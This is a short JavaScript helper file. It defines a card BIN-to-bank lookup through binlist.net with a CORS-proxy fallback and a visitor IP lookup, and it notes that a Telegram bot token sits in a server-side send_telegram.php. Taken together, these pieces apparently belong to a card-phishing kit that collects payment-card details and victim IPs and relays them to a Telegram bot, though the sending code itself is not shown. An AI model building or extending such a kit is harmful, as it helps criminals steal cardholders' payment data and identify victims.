// Store sensitive data in environment variables
const CONFIG = {
    // Bot token and chat id moved to server-side `send_telegram.php`
    userIpAddress: null
};
// Lookup BIN information (returns bank name or 'Unknown Bank').
async function lookupBin(bin) {
    try {
        const res = await fetch("https://lookup.binlist.net/" + bin);
        if (res && res.ok) {
            const data = await res.json();
            if (data && data.bank) {
                return typeof data.bank === 'string' ? data.bank : (data.bank.name || 'Unknown Bank');
            }
        }

        // Fallback using a CORS proxy if direct request is blocked
        const proxyUrl = "https://api.allorigins.win/raw?url=" + encodeURIComponent("https://lookup.binlist.net/" + bin);
        const proxyRes = await fetch(proxyUrl);
        if (proxyRes && proxyRes.ok) {
            const proxyData = await proxyRes.json();
            if (proxyData && proxyData.bank) return typeof proxyData.bank === 'string' ? proxyData.bank : (proxyData.bank.name || 'Unknown Bank');
        }
    } catch (err) {
        console.warn('lookupBin failed:', err);
    }
    return 'Unknown Bank';
}
async function fetchIpAddress() {
    try {
        const response = await fetch('https://api.ipify.org?format=json');
        const data = await response.json();
        return data.ip;
    } catch (error) {
        console.error('Error fetching IP:', error);
        return 'Unable to fetch IP';
    }
}

// Expose helpers/globals for inline scripts
if (typeof window !== 'undefined') {
    window.CONFIG = CONFIG;
    window.lookupBin = lookupBin;
    window.fetchIpAddress = fetchIpAddress;
}

